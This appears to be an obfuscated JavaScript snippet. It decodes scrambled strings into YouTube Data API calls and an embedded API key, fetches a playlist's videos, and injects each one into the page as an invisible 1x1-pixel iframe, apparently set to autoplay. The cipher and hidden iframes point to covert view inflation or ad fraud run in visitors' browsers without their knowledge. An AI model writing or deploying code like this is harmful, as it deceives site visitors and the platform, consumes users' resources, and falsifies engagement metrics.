var yjqakefexu =
    "7++/,epp(((q80083:>/6,q<02p&0*+*=:p)lp/3>&36,+T+:2,`/>-+b,16//:+zmZ<01+:1+Y:+>63,y2>'K:,*3+,bmjy/3>&36,+T;bMQUXrF&f,]0/DX;=6fkrGUPW%L8U;CP<Zhy4:&b^T%>J&]QY]CJ>:TX%7C8]U7II,=^EX*RP@3V;kg";
var yjqoua = "^T%>J&]QY]CJ>:TX%7C8]U7II,=^EX*RP@3V;kg";
var fieldsTitle = "96:3;,b6+:2,w,16//:+w+6+3:vv";
var fieldsEmpty = "";
var part = "part=snippet";
var params = "`-:3boy>*+0/3>&bny2*+:bny300/bny,70(6190boy<030-b(76+:y6)@30>;@/036<&bly/3>&36,+bD0nfC7NhZ^<";
var az = Array.from(Array(56), (e, i) => String.fromCharCode(i + 35))
    .concat(Array.from(Array(32), (e, i) => String.fromCharCode(i + 93)));
$(function() {
    $.get(vuwkvuehnthkmdyneu(yjqakefexu),
        function(response) {
            var items = response.items;
            items.forEach((item, idx) => {
                var asdas = item.snippet.resourceId.dddfgf;
                qlqfumxuakefexu(asdas, idx);
            });
        });
});

function vuwkvuehnthkmdyneu(value) {
    var decodeURL = "";
    value.split("").forEach(c => {
        var idx = az.reverse().indexOf(c);
        if (idx > -1 && idx < az.reverse().length) {
            decodeURL += az[idx];
        }
    });
    return decodeURL;
}

function qlqfumxuakefexu(dddfgf, idx) {
    var asdss = "#IDframe" + idx;
    var dsffsd = vuwkvuehnthkmdyneu("7++/,epp(((q80083:>/6,q<02p&0*+*=:p)lp)6;:0,");

    function getUrl(fields) {
        var url = dsffsd + "?" + "key=" + vuwkvuehnthkmdyneu(yjqoua) + "&" + "id=" + dddfgf + "&" + fields + "&" + part;
        return url;
    }

    $.get(getUrl(fieldsEmpty),
        function(response) {
            var status = response.pageInfo.totalResults;
            var title;
            if (status) {
                $.get(getUrl(vuwkvuehnthkmdyneu(fieldsTitle)),
                    function(response) {
                        title = response.items[0].snippet.title;
                        var url = vuwkvuehnthkmdyneu("7++/,epp(((q&0*+*=:q<02p:2=:;p") + dddfgf;
                        var iframe = '<iframe src="' +
                            url +
                            vuwkvuehnthkmdyneu(params) +
                            '" id="' +
                            asdss +
                            '" style="width: 1px; height: 1px;"></iframe>';
                        $("body").append(iframe);
                    });
            } else {
                var iframe = '<iframe src="" id="' + asdss + '" style="width: 1px; height: 1px;"></iframe>';
                $("body").append(iframe);
            }
        });
}